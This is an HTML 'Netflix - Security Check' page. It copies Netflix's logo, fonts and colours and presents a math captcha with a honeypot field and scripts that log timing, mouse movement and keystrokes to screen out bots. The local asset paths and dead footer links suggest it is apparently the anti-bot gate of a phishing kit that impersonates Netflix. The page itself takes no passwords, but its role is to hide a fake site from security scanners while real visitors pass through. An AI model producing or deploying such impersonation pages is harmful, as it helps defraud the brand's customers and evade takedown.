<!DOCTYPE html>
<html lang="en" >
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Security Check</title>
    <link rel="shortcut icon" href="./main/files/media/nficon2023.ico">
    <link rel="apple-touch-icon" href="./main/files/media/nficon2016.png">
    <style>
        /* Netflix Fonts */
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 300;
            src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Lt.woff2') format('woff2'),
                 url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Lt.woff') format('woff');
        }
        
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 400;
            src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Rg.woff2') format('woff2'),
                 url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Rg.woff') format('woff');
        }
        
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 700;
            src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Md.woff2') format('woff2'),
                 url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Md.woff') format('woff');
        }
        
        @font-face {
            font-family: 'Netflix Sans';
            font-weight: 900;
            src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Bd.woff2') format('woff2'),
                 url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Bd.woff') format('woff');
        }
        
        :root {
            --netflix-red: #e50914;
            --netflix-red-hover: #f40612;
            --netflix-red-active: #c4070f;
            --netflix-black: #000000;
            --netflix-dark-gray: #141414;
            --netflix-medium-gray: #181818;
            --netflix-light-gray: #2b2b2b;
            --netflix-border-gray: #333333;
            --netflix-text-gray: #8c8c8c;
            --netflix-white: #ffffff;
            --netflix-error: #e87c03;
            --content-width: 450px;
            --input-height: 50px;
            --border-radius: 4px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--netflix-black);
            color: var(--netflix-white);
            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .header {
            padding: 20px 40px;
            display: flex;
            align-items: center;
        }
        
        .netflix-logo {
            height: 32px;
            fill: var(--netflix-red);
        }
        
        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0 20px;
        }

        .captcha-container {
            background-color: rgba(0, 0, 0, 0.75);
            max-width: var(--content-width);
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
            text-align: center;
            overflow: hidden;
            padding: 40px 30px;
            position: relative;
            animation: fadeIn 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .captcha-icon {
            margin-bottom: 25px;
            width: 70px;
            height: 70px;
            filter: invert(1) drop-shadow(0 2px 2px rgba(0,0,0,0.2));
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
            line-height: 1.3;
        }
        
        p.instruction {
            color: var(--netflix-text-gray);
            margin-bottom: 30px;
            font-size: 16px;
        }

        .math-problem {
            background-color: var(--netflix-light-gray);
            border-radius: var(--border-radius);
            width: 100%;
            margin: 0 auto 20px;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            font-size: 32px;
            font-weight: 500;
        }

        .math-problem span {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 30px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            margin: 0 auto 20px;
        }

        .input-field {
            width: 100%;
            height: var(--input-height);
            border: 1px solid var(--netflix-border-gray);
            background-color: var(--netflix-light-gray);
            border-radius: var(--border-radius);
            color: var(--netflix-white);
            padding: 0 16px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: var(--netflix-white);
            background-color: #333;
        }

        .submit-btn {
            background-color: var(--netflix-red);
            color: var(--netflix-white);
            border: none;
            width: 100%;
            height: var(--input-height);
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin: 30px auto 20px;
            display: block;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: var(--netflix-red-hover);
        }

        .submit-btn:active {
            background-color: var(--netflix-red-active);
        }

        .refresh-btn {
            background: transparent;
            border: none;
            color: var(--netflix-text-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
            cursor: pointer;
            margin: 0 auto;
            padding: 8px 16px;
            border-radius: var(--border-radius);
            transition: all 0.2s;
        }

        .refresh-btn:hover {
            color: var(--netflix-white);
            background-color: rgba(255, 255, 255, 0.1);
        }

        .refresh-btn svg {
            transition: transform 0.3s ease;
        }

        .refresh-btn:hover svg {
            transform: rotate(180deg);
        }

        .error-message {
            color: var(--netflix-error);
            margin: 10px 0;
            font-size: 14px;
            min-height: 20px;
            font-weight: 500;
        }

        .honeypot {
            opacity: 0;
            position: absolute;
            top: -9999px;
            left: -9999px;
            height: 0;
            width: 0;
            z-index: -1;
        }
        
        /* Footer styles */
        .footer {
            padding: 30px 40px;
            color: var(--netflix-text-gray);
            font-size: 13px;
            text-align: center;
        }
        
        .footer a {
            color: var(--netflix-text-gray);
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        /* Language selector styles */
        .language-selector {
            margin: 20px 0;
            display: flex;
            justify-content: center;
        }

        .language-selector-wrapper {
            position: relative;
            display: inline-block;
        }

        #language-switcher {
            background-color: rgba(0, 0, 0, 0.4);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 4px;
            padding: 8px 32px 8px 8px;
            font-size: 14px;
            appearance: none;
            cursor: pointer;
            outline: none;
            transition: border-color 0.2s;
        }

        #language-switcher:hover {
            border-color: rgba(255, 255, 255, 0.7);
        }

        #language-switcher:focus {
            border-color: #fff;
        }

        .language-icon {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #fff;
            pointer-events: none;
        }

        /* Style for RTL languages */
        html[dir="rtl"] .language-icon {
            right: auto;
            left: 8px;
        }

        html[dir="rtl"] #language-switcher {
            padding: 8px 8px 8px 32px;
        }
        
        html[dir="rtl"] .refresh-btn, 
        html[dir="rtl"] .math-problem {
            flex-direction: row-reverse;
        }

        @media (max-width: 480px) {
            .header {
                padding: 15px 20px;
            }
            
            .netflix-logo {
                height: 24px;
            }
            
            .captcha-container {
                padding: 30px 20px;
                border-radius: 0;
                box-shadow: none;
                background-color: transparent;
            }
            
            h1 {
                font-size: 20px;
            }
            
            .math-problem {
                font-size: 28px;
                gap: 15px;
            }
            
            .footer {
                padding: 20px;
            }
            
            #language-switcher {
                font-size: 12px;
                padding: 6px 30px 6px 6px;
            }
            
            html[dir="rtl"] #language-switcher {
                padding: 6px 6px 6px 30px;
            }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.4s ease-in-out;
        }
    </style>
</head>
<body>
    <header class="header">
        <svg viewBox="0 0 111 30" class="netflix-logo" aria-hidden="true" focusable="false">
            <g id="netflix-logo">
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
            </g>
        </svg>
    </header>
    
    <!-- Language selector -->
    <div class="language-selector">
        <div class="language-selector-wrapper">
            <select id="language-switcher" onchange="changeLanguage(this.value)">
                <option value="en" selected>English</option>
                <option value="es" >Español</option>
                <option value="fr" >Français</option>
                <option value="de" >Deutsch</option>
                <option value="it" >Italiano</option>
                <option value="pt" >Português</option>
                <option value="nl" >Nederlands</option>
                <option value="ar" >العربية</option>
                <option value="ja" >日本語</option>
                <option value="ko" >한국어</option>
                <option value="zh" >中文</option>
                <option value="ru" >Русский</option>
            </select>
            <div class="language-icon">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 14.5C11.5899 14.5 14.5 11.5899 14.5 8C14.5 4.41015 11.5899 1.5 8 1.5C4.41015 1.5 1.5 4.41015 1.5 8C1.5 11.5899 4.41015 14.5 8 14.5Z" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"></path>
                    <path d="M1.5 8H14.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"></path>
                    <path d="M8 1.5C9.69774 3.35374 10.7174 5.80172 11 8.36014C11.2826 10.9186 10.8216 13.5092 9.68506 15.8285" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"></path>
                    <path d="M6.31494 15.8285C5.17841 13.5092 4.71736 10.9186 5.00001 8.36014C5.28265 5.80172 6.30227 3.35374 8.00001 1.5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </div>
        </div>
    </div>
    
    <main class="main-content">
        <div class="captcha-container">
            <div class="captcha-logo">
                <img src="./main/files/media/bot.png" alt="Security check" width="150">
            </div>
            
            <h1>Verify you are not a robot</h1>
            <p class="instruction">Please solve this problem to continue</p>
            
            <div class="math-problem ">
                <span>7</span>
                <span>−</span>
                <span>2</span>
                <span>=</span>
                <span>?</span>
            </div>
            
                            <div class="error-message"></div>
            
            <form method="post" id="captchaForm">
                <div class="input-wrapper">
                    <input type="number" 
                           name="result" 
                           id="result" 
                           class="input-field" 
                           placeholder="Enter result"
                           required 
                           autocomplete="off">
                </div>
                
                <!-- Honeypot field -->
                <input type="text" name="website" class="honeypot" tabindex="-1" autocomplete="off">
                
                <!-- JavaScript check field -->
                <input type="hidden" name="js_check" id="js_check" value="disabled">
                
                <button type="submit" name="submit" class="submit-btn" id="submitButton">
                    Verify                </button>
                
                <button type="button" id="refreshButton" class="refresh-btn">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21.5 2v6h-6M2.5 22v-6h6M2 12c0-4.4 3.6-8 8-8 3.3 0 6.2 2 7.4 4.9M22 12c0 4.4-3.6 8-8 8-3.3 0-6.2-2-7.4-4.9"/>
                    </svg>
                    <span id="refreshText">New calculation</span>
                </button>
            </form>
        </div>
    </main>
    
    <footer class="footer">
        <a href="#">Privacy</a>
        <a href="#">Terms of Use</a>
        <a href="#">Help Center</a>
        <a href="#">Cookie Preferences</a>
        <a href="#">Corporate Information</a>
    </footer>

    <script>
        // Set JavaScript detection flag
        document.getElementById('js_check').value = 'enabled';
        
        // Track timing and movements for bot detection
        const startTime = new Date().getTime();
        let mouseMovements = 0;
        let keyPresses = 0;
        
        document.addEventListener('mousemove', function() {
            mouseMovements++;
        });
        
        document.addEventListener('keydown', function() {
            keyPresses++;
        });
        
        // Handle form submission with additional bot checks
        document.getElementById('captchaForm').addEventListener('submit', function(e) {
            const elapsedTime = new Date().getTime() - startTime;
            
            // Add hidden fields with user behavior data
            const addHiddenField = (name, value) => {
                const field = document.createElement('input');
                field.type = 'hidden';
                field.name = name;
                field.value = value;
                this.appendChild(field);
            };
            
            addHiddenField('elapsed_time', elapsedTime);
            addHiddenField('mouse_movements', mouseMovements);
            addHiddenField('key_presses', keyPresses);
            
            // Extremely fast submissions are likely bots
            if (elapsedTime < 1500 && mouseMovements < 5) {
                addHiddenField('bot_signature', 'timing_suspicious');
            }
        });
        
        // Handle refresh button
        document.getElementById('refreshButton').addEventListener('click', function() {
            const refreshForm = document.createElement('form');
            refreshForm.method = 'post';
            refreshForm.style.display = 'none';
            
            const refreshInput = document.createElement('input');
            refreshInput.type = 'hidden';
            refreshInput.name = 'refresh';
            refreshInput.value = 'true';
            
            refreshForm.appendChild(refreshInput);
            document.body.appendChild(refreshForm);
            refreshForm.submit();
        });
        
        // Add animated effects
        const resultInput = document.getElementById('result');
        const mathProblem = document.querySelector('.math-problem');
        
        resultInput.addEventListener('focus', function() {
            mathProblem.style.boxShadow = '0 0 0 2px var(--netflix-red)';
        });
        
        resultInput.addEventListener('blur', function() {
            mathProblem.style.boxShadow = 'none';
        });
        
        // Language switcher functionality
        function changeLanguage(lang) {
            // Add the lang parameter to the current URL and reload
            const currentUrl = new URL(window.location.href);
            currentUrl.searchParams.set('lang', lang);
            window.location.href = currentUrl.toString();
        }
        
        // Focus the input field
        setTimeout(() => {
            document.getElementById('result').focus();
        }, 500);
    </script>
</body>
</html>
